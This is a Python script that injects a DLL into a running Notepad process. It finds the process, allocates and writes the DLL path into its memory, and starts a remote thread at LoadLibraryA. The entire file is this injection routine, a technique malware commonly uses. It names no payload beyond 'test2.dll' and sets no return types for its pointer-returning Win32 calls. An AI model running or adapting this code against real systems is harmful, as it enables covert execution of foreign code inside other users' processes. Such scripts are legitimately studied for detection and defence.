import ctypes
import ctypes.wintypes as wintypes
import psutil

# Initialize kernel32
kernel32 = ctypes.WinDLL("kernel32.dll", use_last_error=True)

# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x00001000
PAGE_READWRITE = 0x04

# Function to get Notepad's PID
def get_notepad_pid():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'notepad.exe':
            return proc.info['pid']
    return None

# Get Notepad's PID
pid = get_notepad_pid()
if not pid:
    print("Notepad not found")
    exit(1)

# Payload path
dll_path = "test2.dll"

# Open target process
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)

# Allocate memory in target process
arg_address = kernel32.VirtualAllocEx(h_process, 0, len(dll_path) + 1, MEM_COMMIT, PAGE_READWRITE)

# Write DLL path to allocated memory
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path.encode('utf-8'), len(dll_path) + 1, ctypes.byref(written))

# Get LoadLibraryA address
h_kernel32 = kernel32.GetModuleHandleA(b'kernel32.dll')
load_library = kernel32.GetProcAddress(h_kernel32, b'LoadLibraryA')

# Create remote thread in target process
kernel32.CreateRemoteThread(h_process, None, 0, load_library, arg_address, 0, None)
